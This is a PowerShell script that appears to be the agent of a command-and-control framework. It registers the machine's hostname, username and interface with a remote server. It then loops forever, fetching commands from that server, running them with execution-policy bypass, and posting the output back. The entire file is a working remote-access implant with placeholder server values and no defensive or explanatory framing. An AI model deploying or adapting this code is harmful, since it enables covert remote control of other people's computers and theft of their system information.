function Invoke-Executable {
    # Runs the specified executable and captures its exit code, stdout
    # and stderr.
    # Returns: custom object.
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]$sExeFile,
        [Parameter(Mandatory=$false)]
        [String[]]$cArgs,
        [Parameter(Mandatory=$false)]
        [String]$sVerb
    )

    # Setting process invocation parameters.
    $oPsi = New-Object -TypeName System.Diagnostics.ProcessStartInfo
    $oPsi.CreateNoWindow = $true
    $oPsi.UseShellExecute = $false
    $oPsi.RedirectStandardOutput = $true
    $oPsi.RedirectStandardError = $true
    $oPsi.FileName = $sExeFile
    if (! [String]::IsNullOrEmpty($cArgs)) {
        $oPsi.Arguments = $cArgs
    }
    if (! [String]::IsNullOrEmpty($sVerb)) {
        $oPsi.Verb = $sVerb
    }

    # Creating process object.
    $oProcess = New-Object -TypeName System.Diagnostics.Process
    $oProcess.StartInfo = $oPsi

    # Creating string builders to store stdout and stderr.
    $oStdOutBuilder = New-Object -TypeName System.Text.StringBuilder
    $oStdErrBuilder = New-Object -TypeName System.Text.StringBuilder

    # Adding event handers for stdout and stderr.
    $sScripBlock = {
        if (! [String]::IsNullOrEmpty($EventArgs.Data)) {
            $Event.MessageData.AppendLine($EventArgs.Data)
        }
    }
    $oStdOutEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'OutputDataReceived' `
        -MessageData $oStdOutBuilder
    $oStdErrEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'ErrorDataReceived' `
        -MessageData $oStdErrBuilder

    # Starting process.
    [Void]$oProcess.Start()
    $oProcess.BeginOutputReadLine()
    $oProcess.BeginErrorReadLine()
    [Void]$oProcess.WaitForExit()

    # Unregistering events to retrieve process output.
    Unregister-Event -SourceIdentifier $oStdOutEvent.Name
    Unregister-Event -SourceIdentifier $oStdErrEvent.Name

    $oResult = New-Object -TypeName PSObject -Property ([Ordered]@{
        "ExeFile"  = $sExeFile;
        "Args"     = $cArgs -join " ";
        "ExitCode" = $oProcess.ExitCode;
        "StdOut"   = $oStdOutBuilder.ToString().Trim();
        "StdErr"   = $oStdErrBuilder.ToString().Trim()
    })

    return $oResult.StdOut,$oResult.StdErr
}
###Usage:
#Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', 'systeminfo')



$hostname = [System.Net.Dns]::GetHostName()
$username = $env:UserNAME
$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$interface = "REPLACE_INTERFACE"
# $key  = "REPLACE_KEY"
$n    = 3

$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
$data  = @{
    eth = "$interface" 
    hname = "$hostname"
    username="$username"
    }
    
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
#name= SDFCXS

$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name/")
$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name/")
#http://1.1.1.1:1233/tasks/demo


for (;;){
    
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    #whoami;systeminfo;ech
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-ep bypass /c', $task)
        $data = @{result = "$result"}
        # encryption aes
        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
        #http://192.168.71.142:8000/results/GTLBHU/

        sleep $n
    }
}

